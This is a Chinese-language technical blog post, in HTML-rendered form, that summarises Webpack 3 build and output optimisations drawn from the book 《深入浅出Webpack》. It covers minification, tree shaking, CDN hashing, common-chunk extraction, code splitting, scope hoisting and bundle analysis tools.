压缩代码-JS、ES、CSS</h3><ol>\n<li><p><strong>压缩JS：Webpack内置UglifyJS插件、ParallelUglifyPlugin</strong></p>\n<p>会分析JS代码语法树，理解代码的含义，从而做到去掉无效代码、去掉日志输入代码、缩短变量名等优化。常用配置参数如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> UglifyJSPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/optimize/UglifyJsPlugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins: [</span><br><span class=\"line\">    <span class=\"keyword\">new</span> UglifyJSPlugin(&#123;</span><br><span class=\"line\">        compress: &#123;</span><br><span class=\"line\">            warnings: <span class=\"literal\">false</span>,  <span class=\"comment\">//删除无用代码时不输出警告</span></span><br><span class=\"line\">            drop_console: <span class=\"literal\">true</span>,  <span class=\"comment\">//删除所有console语句，可以兼容IE</span></span><br><span class=\"line\">            collapse_vars: <span class=\"literal\">true</span>,  <span class=\"comment\">//内嵌已定义但只使用一次的变量</span></span><br><span class=\"line\">            reduce_vars: <span class=\"literal\">true</span>,  <span class=\"comment\">//提取使用多次但没定义的静态值到变量</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        output: &#123;</span><br><span class=\"line\">            beautify: <span class=\"literal\">false</span>, <span class=\"comment\">//最紧凑的输出，不保留空格和制表符</span></span><br><span class=\"line\">            comments: <span class=\"literal\">false</span>, <span class=\"comment\">//删除所有注释</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>使用<code>webpack --optimize-minimize</code> 启动webpack，可以注入默认配置的UglifyJSPlugin</p>\n</li>\n<li><p><strong>压缩ES6：第三方UglifyJS插件</strong></p>\n<p>随着越来越多的浏览器支持直接执行ES6代码，应尽可能的运行原生ES6，这样比起转换后的ES5代码，代码量更少，且ES6代码性能更好。直接运行ES6代码时，也需要代码压缩，第三方的uglify-webpack-plugin提供了压缩ES6代码的功能：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i -D uglify-webpack-plugin@beta <span class=\"comment\">//要使用最新版本的插件</span></span><br><span class=\"line\"><span class=\"comment\">//webpack.config.json</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> UglifyESPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'uglify-webpack-plugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> UglifyESPlugin(&#123;</span><br><span class=\"line\">        uglifyOptions: &#123;  <span class=\"comment\">//比UglifyJS多嵌套一层</span></span><br><span class=\"line\">            compress: &#123;</span><br><span class=\"line\">                warnings: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                drop_console: <span class=\"literal\">true</span>,</span><br><span class=\"line\">                collapse_vars: <span class=\"literal\">true</span>,</span><br><span class=\"line\">                reduce_vars: <span class=\"literal\">true</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            output: &#123;</span><br><span class=\"line\">                beautify: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                comments: <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>另外要防止babel-loader转换ES6代码，要在.babelrc中去掉babel-preset-env，因为正是babel-preset-env负责把ES6转换为ES5。</p>\n</li>\n<li><p><strong>压缩CSS：css-loader?minimize、PurifyCSSPlugin</strong></p>\n<p>cssnano基于PostCSS，不仅是删掉空格，还能理解代码含义，例如把<code>color:#ff0000</code> 转换成 <code>color:red</code>，css-loader内置了cssnano，只需要使用 <code>css-loader?minimize</code> 就可以开启cssnano压缩。</p>\n<p>另外一种压缩CSS的方式是使用<a href=\"https://github.com/webpack-contrib/purifycss-webpack\" target=\"_blank\" rel=\"noopener\">PurifyCSSPlugin</a>，需要配合 <code>extract-text-webpack-plugin</code> 使用，它主要的作用是可以去除没有用到的CSS代码，类似JS的Tree Shaking。</p>\n</li>\n</ol>\n<h3 id=\"3-3-使用Tree-Shaking剔除JS死代码\"><a href=\"#3-3-使用Tree-Shaking剔除JS死代码\" class=\"headerlink\" title=\"3.3 使用Tree Shaking剔除JS死代码\"></a>3.3 使用Tree Shaking剔除JS死代码</h3><p>Tree Shaking可以剔除用不上的死代码，它依赖ES6的import、export的模块化语法，最先在Rollup中出现，Webpack 2.0将其引入。适合用于Lodash、utils.js等工具类较分散的文件。<strong>它正常工作的前提是代码必须采用ES6的模块化语法</strong>，因为ES6模块化语法是静态的（在导入、导出语句中的路径必须是静态字符串，且不能放入其他代码块中）。如果采用了ES5中的模块化，例如module.export = {…}、require( x+y )、if (x) { require( ‘./util’ ) }，则Webpack无法分析出可以剔除哪些代码。</p>\n<p><strong>启用Tree Shaking：</strong></p>\n<ol>\n<li><p>修改.babelrc以保留ES6模块化语句：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"presets\"</span>: [</span><br><span class=\"line\">        [</span><br><span class=\"line\">            <span class=\"string\">\"env\"</span>, </span><br><span class=\"line\">            &#123; <span class=\"string\">\"module\"</span>: <span class=\"literal\">false</span> &#125;,   <span class=\"comment\">//关闭Babel的模块转换功能，保留ES6模块化语法</span></span><br><span class=\"line\">        ]</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>启动webpack时带上 –display-used-exports可以在shell打印出关于代码剔除的提示</p>\n</li>\n<li><p>使用UglifyJSPlugin，或者启动时使用–optimize-minimize</p>\n</li>\n<li><p>在使用第三方库时，需要配置 <code>resolve.mainFields: [&#39;jsnext:main&#39;, &#39;main&#39;]</code> 以指明解析第三方库代码时，采用ES6模块化的代码入口</p>\n</li>\n</ol>\n<h2 id=\"四、优化输出质量–加速网络请求\"><a href=\"#四、优化输出质量–加速网络请求\" class=\"headerlink\" title=\"四、优化输出质量–加速网络请求\"></a>四、优化输出质量–加速网络请求</h2><h3 id=\"4-1-使用CDN加速静态资源加载\"><a href=\"#4-1-使用CDN加速静态资源加载\" class=\"headerlink\" title=\"4.1 使用CDN加速静态资源加载\"></a>4.1 使用CDN加速静态资源加载</h3><ol>\n<li><p><strong>CND加速的原理</strong></p>\n<p>CDN通过将资源部署到世界各地，使得用户可以就近访问资源，加快访问速度。要接入CDN，需要把网页的静态资源上传到CDN服务上，在访问这些资源时，使用CDN服务提供的URL。</p>\n<p>由于CDN会为资源开启长时间的缓存，例如用户从CDN上获取了index.html，即使之后替换了CDN上的index.html，用户那边仍会在使用之前的版本直到缓存时间过期。业界做法：</p>\n<ul>\n<li><strong>HTML文件：放在自己的服务器上且关闭缓存，不接入CDN</strong></li>\n<li><strong>静态的JS、CSS、图片等资源：开启CDN和缓存，同时文件名带上由内容计算出的Hash值</strong>，这样只要内容变化hash就会变化，文件名就会变化，就会被重新下载而不论缓存时间多长。</li>\n</ul>\n<p>另外，HTTP1.x版本的协议下，浏览器会对于向同一域名并行发起的请求数限制在4~8个。那么把所有静态资源放在同一域名下的CDN服务上就会遇到这种限制，所以可以把他们<strong>分散放在不同的CDN服务</strong>上，例如JS文件放在js.cdn.com下，将CSS文件放在css.cdn.com下等。这样又会带来一个新的问题：增加了域名解析时间，这个可以通过<strong>dns-prefetch</strong>来解决 <code>&lt;link rel=&#39;dns-prefetch&#39; href=&#39;//js.cdn.com&#39;&gt;</code> 来缩减域名解析的时间。形如<strong><code>//xx.com</code> 这样的URL省略了协议</strong>，这样做的好处是，浏览器在访问资源时会自动根据当前URL采用的模式来决定使用HTTP还是HTTPS协议。</p>\n</li>\n<li><p><strong>总之，构建需要满足以下几点：</strong></p>\n<ul>\n<li>静态资源导入的URL要变成指向CDN服务的绝对路径的URL</li>\n<li>静态资源的文件名需要带上根据内容计算出的Hash值</li>\n<li>不同类型资源放在不同域名的CDN上</li>\n</ul>\n</li>\n<li><p><strong>最终配置：</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ExtractTextPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'extract-text-webpack-plugin'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123;WebPlugin&#125; = <span class=\"built_in\">require</span>(<span class=\"string\">'web-webpack-plugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">output:&#123;</span><br><span class=\"line\"> filename: <span class=\"string\">'[name]_[chunkhash:8].js'</span>,</span><br><span class=\"line\"> path: path.resolve(__dirname, <span class=\"string\">'dist'</span>),</span><br><span class=\"line\"> publicPatch: <span class=\"string\">'//js.cdn.com/id/'</span>, <span class=\"comment\">//指定存放JS文件的CDN地址</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"><span class=\"built_in\">module</span>:&#123;</span><br><span class=\"line\"> rules:[&#123;</span><br><span class=\"line\">     test: <span class=\"regexp\">/\\.css/</span>,</span><br><span class=\"line\">     use: ExtractTextPlugin.extract(&#123;</span><br><span class=\"line\">         use: [<span class=\"string\">'css-loader?minimize'</span>],</span><br><span class=\"line\">         publicPatch: <span class=\"string\">'//img.cdn.com/id/'</span>, <span class=\"comment\">//指定css文件中导入的图片等资源存放的cdn地址</span></span><br><span class=\"line\">     &#125;),</span><br><span class=\"line\"> &#125;,&#123;</span><br><span class=\"line\">    test: <span class=\"regexp\">/\\.png/</span>,</span><br><span class=\"line\">    use: [<span class=\"string\">'file-loader?name=[name]_[hash:8].[ext]'</span>], <span class=\"comment\">//为输出的PNG文件名加上Hash值 </span></span><br><span class=\"line\"> &#125;]</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">  <span class=\"keyword\">new</span> WebPlugin(&#123;</span><br><span class=\"line\">     template: <span class=\"string\">'./template.html'</span>,</span><br><span class=\"line\">     filename: <span class=\"string\">'index.html'</span>,</span><br><span class=\"line\">     stylePublicPath: <span class=\"string\">'//css.cdn.com/id/'</span>, <span class=\"comment\">//指定存放CSS文件的CDN地址</span></span><br><span class=\"line\">  &#125;),</span><br><span class=\"line\"> <span class=\"keyword\">new</span> ExtractTextPlugin(&#123;</span><br><span class=\"line\">     filename:<span class=\"string\">`[name]_[contenthash:8].css`</span>, <span class=\"comment\">//为输出的CSS文件加上Hash</span></span><br><span class=\"line\"> &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"4-2-多页面应用提取页面间公共代码，以利用缓存\"><a href=\"#4-2-多页面应用提取页面间公共代码，以利用缓存\" class=\"headerlink\" title=\"4.2 多页面应用提取页面间公共代码，以利用缓存\"></a>4.2 多页面应用提取页面间公共代码，以利用缓存</h3><ol>\n<li><p><strong>原理</strong></p>\n<p>大型网站通常由多个页面组成，每个页面都是一个独立的单页应用，多个页面间肯定会依赖同样的样式文件、技术栈等。如果不把这些公共文件提取出来，那么每个单页打包出来的chunk中都会包含公共代码，相当于要传输n份重复代码。如果把公共文件提取出一个文件，那么当用户访问了一个网页，加载了这个公共文件，再访问其他依赖公共文件的网页时，就直接使用文件在浏览器的缓存，这样公共文件就只用被传输一次。</p>\n</li>\n<li><p><strong>应用方法</strong></p>\n<ol>\n<li><p>把多个页面依赖的公共代码提取到common.js中，此时common.js包含基础库的代码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> CommonsChunkPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/optimize/CommonsChunkPlugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> CommonsChunkPlugin(&#123;</span><br><span class=\"line\">        chunks:[<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>], <span class=\"comment\">//从哪些chunk中提取</span></span><br><span class=\"line\">        name:<span class=\"string\">'common'</span>,  <span class=\"comment\">// 提取出的公共部分形成一个新的chunk</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>找出依赖的基础库，写一个base.js文件，再与common.js提取公共代码到base中，common.js就剔除了基础库代码，而base.js保持不变</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//base.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'react-dom'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'./base.css'</span>;</span><br><span class=\"line\"><span class=\"comment\">//webpack.config.json</span></span><br><span class=\"line\">entry:&#123;</span><br><span class=\"line\">    base: <span class=\"string\">'./base.js'</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> CommonsChunkPlugin(&#123;</span><br><span class=\"line\">        chunks:[<span class=\"string\">'base'</span>,<span class=\"string\">'common'</span>],</span><br><span class=\"line\">        name:<span class=\"string\">'base'</span>,</span><br><span class=\"line\">        <span class=\"comment\">//minChunks:2, 表示文件要被提取出来需要在指定的chunks中出现的最小次数，防止common.js中没有代码的情况</span></span><br><span class=\"line\">    &#125;)        </span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>得到基础库代码base.js，不含基础库的公共代码common.js，和页面各自的代码文件xx.js。</p>\n<p>页面引用顺序如下：base.js–&gt; common.js–&gt; xx.js</p>\n</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"4-3-分割代码以按需加载\"><a href=\"#4-3-分割代码以按需加载\" class=\"headerlink\" title=\"4.3 分割代码以按需加载\"></a>4.3 分割代码以按需加载</h3><ol>\n<li><p><strong>原理</strong></p>\n<p>单页应用的一个问题在于使用一个页面承载复杂的功能，要加载的文件体积很大，不进行优化的话会导致首屏加载时间过长，影响用户体验。做按需加载可以解决这个问题。具体方法如下：</p>\n<ol>\n<li>将网站功能按照相关程度划分成几类</li>\n<li>每一类合并成一个Chunk，按需加载对应的Chunk</li>\n<li>例如，只把首屏相关的功能放入执行入口所在的Chunk，这样首次加载少量的代码，其他代码要用到的时候再去加载。最好提前预估用户接下来的操作，提前加载对应代码，让用户感知不到网络加载</li>\n</ol>\n</li>\n<li><p><strong>做法</strong></p>\n<p>一个最简单的例子：网页首次只加载main.js，网页展示一个按钮，点击按钮时加载分割出去的show.js，加载成功后执行show.js里的函数</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//main.js</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'btn'</span>).addEventListener(<span class=\"string\">'click'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName:\"show\" */</span> <span class=\"string\">'./show'</span>).then(<span class=\"function\">(<span class=\"params\">show</span>)=&gt;</span>&#123;</span><br><span class=\"line\">        show(<span class=\"string\">'Webpack'</span>);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"comment\">//show.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">content</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.alert(<span class=\"string\">'Hello '</span> + content);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>import(/* webpackChunkName:show */ &#39;./show&#39;).then()</code> 是实现按需加载的关键，Webpack内置对import( *)语句的支持，Webpack会以<code>./show.js</code>为入口重新生成一个Chunk。代码在浏览器上运行时只有点击了按钮才会开始加载show.js，且import语句会返回一个Promise，加载成功后可以在then方法中获取加载的内容。这要求浏览器支持Promise API，对于不支持的浏览器，需要注入Promise polyfill。<code>/* webpackChunkName:show */</code> 是定义动态生成的Chunk的名称，默认名称是[id].js，定义名称方便调试代码。为了正确输出这个配置的ChunkName，还需要配置Webpack：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">output:&#123;</span><br><span class=\"line\">    filename:<span class=\"string\">'[name].js'</span>,</span><br><span class=\"line\">    chunkFilename:<span class=\"string\">'[name].js'</span>, <span class=\"comment\">//指定动态生成的Chunk在输出时的文件名称</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>书中另外提供了更复杂的React-Router中异步加载组件的实战场景。P212</p>\n</li>\n</ol>\n<h2 id=\"五、优化输出质量–提升代码运行时的效率\"><a href=\"#五、优化输出质量–提升代码运行时的效率\" class=\"headerlink\" title=\"五、优化输出质量–提升代码运行时的效率\"></a>五、优化输出质量–提升代码运行时的效率</h2><h3 id=\"5-1-使用Prepack提前求值\"><a href=\"#5-1-使用Prepack提前求值\" class=\"headerlink\" title=\"5.1 使用Prepack提前求值\"></a>5.1 使用Prepack提前求值</h3><ol>\n<li><p><strong>原理：</strong></p>\n<p>Prepack是一个部分求值器，编译代码时提前将计算结果放到编译后的代码中，而不是在代码运行时才去求值。通过在便一阶段预先执行源码来得到执行结果，再直接将运行结果输出以提升性能。但是现在Prepack还不够成熟，用于线上环境还为时过早。</p>\n</li>\n<li><p><strong>使用方法</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> PrepackWebpackPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'prepack-webpack-plugin'</span>).default;</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    plugins:[</span><br><span class=\"line\">        <span class=\"keyword\">new</span> PrepackWebpackPlugin()</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-2-使用Scope-Hoisting\"><a href=\"#5-2-使用Scope-Hoisting\" class=\"headerlink\" title=\"5.2 使用Scope Hoisting\"></a>5.2 使用Scope Hoisting</h3></li>\n<li><p><strong>原理</strong></p>\n<p>译作“作用域提升”，是在Webpack3中推出的功能，它分析模块间的依赖关系，尽可能将被打散的模块合并到一个函数中，但不能造成代码冗余，所以只有被引用一次的模块才能被合并。由于需要分析模块间的依赖关系，所以源码必须是采用了ES6模块化的，否则Webpack会降级处理不采用Scope Hoisting。</p>\n</li>\n<li><p><strong>使用方法</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ModuleConcatenationPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/optimize/ModuleConcatenationPlugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ModuleConcatenationPlugin();</span><br><span class=\"line\">],</span><br><span class=\"line\">resolve:&#123;</span><br><span class=\"line\">\tmainFields:[<span class=\"string\">'jsnext:main'</span>,<span class=\"string\">'browser'</span>,<span class=\"string\">'main'</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>webpack --display-optimization-bailout</code> 输出日志中会提示哪个文件导致了降级处理</p>\n</li>\n</ol>\n<h2 id=\"六、使用输出分析工具\"><a href=\"#六、使用输出分析工具\" class=\"headerlink\" title=\"六、使用输出分析工具\"></a>六、使用输出分析工具</h2><p>   启动Webpack时带上这两个参数可以生成一个json文件，输出分析工具大多依赖该文件进行分析：</p>\n<p>   <code>webpack --profile --json &gt; stats.json</code> 其中 <code>--profile</code> 记录构建过程中的耗时信息，<code>--json</code> 以JSON的格式输出构建结果，<code>&gt;stats.json</code> 是UNIX / Linux系统中的管道命令，含义是将内容通过管道输出到stats.json文件中。</p>\n<ol>\n<li><p><strong>官方工具Webpack Analyse</strong></p>\n<p>打开该工具的官网<a href=\"http://webpack.github.io/analyse/上传stats.json，就可以得到分析结果\" target=\"_blank\" rel=\"noopener\">http://webpack.github.io/analyse/上传stats.json，就可以得到分析结果</a></p>\n</li>\n<li><p><strong>webpack-bundle-analyzer</strong></p>\n<p>可视化分析工具，比Webapck Analyse更直观。使用也很简单：</p>\n<ol>\n<li>npm  i -g webpack-bundle-analyzer安装到全局</li>\n<li>按照上面方法生成stats.json文件</li>\n<li>在项目根目录执行<code>webpack-bundle-analyzer</code> ，浏览器会自动打开结果分析页面。</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"七、其他Tips\"><a href=\"#七、其他Tips\" class=\"headerlink\" title=\"七、其他Tips\"></a>七、其他Tips</h2><ol>\n<li><p>配置babel-loader时，<code>use: [‘babel-loader?cacheDirectory’]</code> cacheDirectory用于缓存babel的编译结果，加快重新编译的速度。另外注意排除node_modules文件夹，因为文件都使用了ES5的语法，没必要再使用Babel转换。</p>\n</li>\n<li><p>配置externals，排除因为已使用\\&lt;script>标签引入而不用打包的代码，noParse是排除没使用模块化语句的代码。</p>\n</li>\n<li><p>配置performance参数可以输出文件的性能检查配置。</p>\n</li>\n<li><p>配置profile：true，是否捕捉Webpack构建的性能信息，用于分析是什么原因导致构建性能不佳。</p>\n</li>\n<li><p>配置cache：true，是否启用缓存来提升构建速度。</p>\n</li>\n<li><p>可以使用url-loader把小图片转换成base64嵌入到JS或CSS中，减少加载次数。</p>\n</li>\n<li><p>通过imagemin-webpack-plugin压缩图片，通过webpack-spritesmith制作雪碧图。</p>\n</li>\n<li><p>开发环境下将devtool设置为cheap-module-eval-source-map，因为生成这种source map的速度最快，能加速构建。在生产环境下将devtool设置为hidden-source-map</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>Webpack是现在主流的功能强大的模块化打包工具，在使用Webpack时，如果不注意性能优化，有非常大的可能会产生性能问题，性能问题主要分为开发时打包构建速度慢、开发调试时的重复性工作、以及输出文件质量不高等，因此性能优化也主要从这些方面来分析。本文主要是根据自己的理解对《深入浅出Webpack》这本书进行总结，涵盖了大部分的优化方法，可以作为Webpack性能优化时的参考和检查清单。基于Webpack3.4版本，阅读本文需要您熟悉Webpack基本使用方法，读完大约需要三十分钟。</p>","more":"<blockquote>\n<p>From  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a></p>\n</blockquote>\n<h2 id=\"一、优化构建速度\"><a href=\"#一、优化构建速度\" class=\"headerlink\" title=\"一、优化构建速度\"></a>一、优化构建速度</h2><p>Webpack在启动后会根据Entry配置的入口出发，递归地解析所依赖的文件。这个过程分为搜索文件和把匹配的文件进行分析、转化的两个过程，因此可以从这两个角度来进行优化配置。</p>\n<h3 id=\"1-1-缩小文件的搜索范围\"><a href=\"#1-1-缩小文件的搜索范围\" class=\"headerlink\" title=\"1.1 缩小文件的搜索范围\"></a>1.1 缩小文件的搜索范围</h3><p><strong>搜索过程优化方式包括：</strong></p>\n<ol>\n<li><p><strong><code>resolve</code>字段告诉webpack怎么去搜索文件，所以首先要重视resolve字段的配置：</strong></p>\n<ol>\n<li><p>设置<code>resolve.modules:[path.resolve(__dirname, &#39;node_modules&#39;)]</code>避免层层查找。</p>\n<p><code>resolve.modules</code>告诉webpack去哪些目录下寻找第三方模块，默认值为<code>[&#39;node_modules&#39;]</code>，会依次查找./node_modules、../node_modules、../../node_modules。</p>\n</li>\n<li><p>设置<code>resolve.mainFields:[&#39;main&#39;]</code>，设置尽量少的值可以减少入口文件的搜索步骤</p>\n<p>第三方模块为了适应不同的使用环境，会定义多个入口文件，mainFields定义使用第三方模块的哪个入口文件，由于大多数第三方模块都使用main字段描述入口文件的位置，所以可以设置单独一个main值，减少搜索</p>\n</li>\n<li><p>对庞大的第三方模块设置<code>resolve.alias</code>, 使webpack直接使用库的min文件，避免库内解析</p>\n<p>如对于react：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">resolve.alias:&#123;</span><br><span class=\"line\">\t<span class=\"string\">'react'</span>:patch.resolve(__dirname, <span class=\"string\">'./node_modules/react/dist/react.min.js'</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样会影响Tree-Shaking，适合对整体性比较强的库使用，如果是像lodash这类工具类的比较分散的库，比较适合Tree-Shaking，避免使用这种方式。</p>\n</li>\n<li><p>合理配置<code>resolve.extensions</code>，减少文件查找</p>\n<p>默认值：<code>extensions:[&#39;.js&#39;, &#39;.json&#39;]</code>,当导入语句没带文件后缀时，Webpack会根据extensions定义的后缀列表进行文件查找，所以：</p>\n<ul>\n<li>列表值尽量少</li>\n<li>频率高的文件类型的后缀写在前面</li>\n<li>源码中的导入语句尽可能的写上文件后缀，如<code>require(./data)</code>要写成<code>require(./data.json)</code></li>\n</ul>\n</li>\n</ol>\n</li>\n<li><p><strong><code>module.noParse</code>字段告诉Webpack不必解析哪些文件，可以用来排除对非模块化库文件的解析</strong></p>\n<p>如jQuery、ChartJS，另外如果使用resolve.alias配置了react.min.js，则也应该排除解析，因为react.min.js经过构建，已经是可以直接运行在浏览器的、非模块化的文件了。noParse值可以是RegExp、[RegExp]、function</p>\n<p><code>module:{ noParse:[/jquery|chartjs/, /react\\.min\\.js$/] 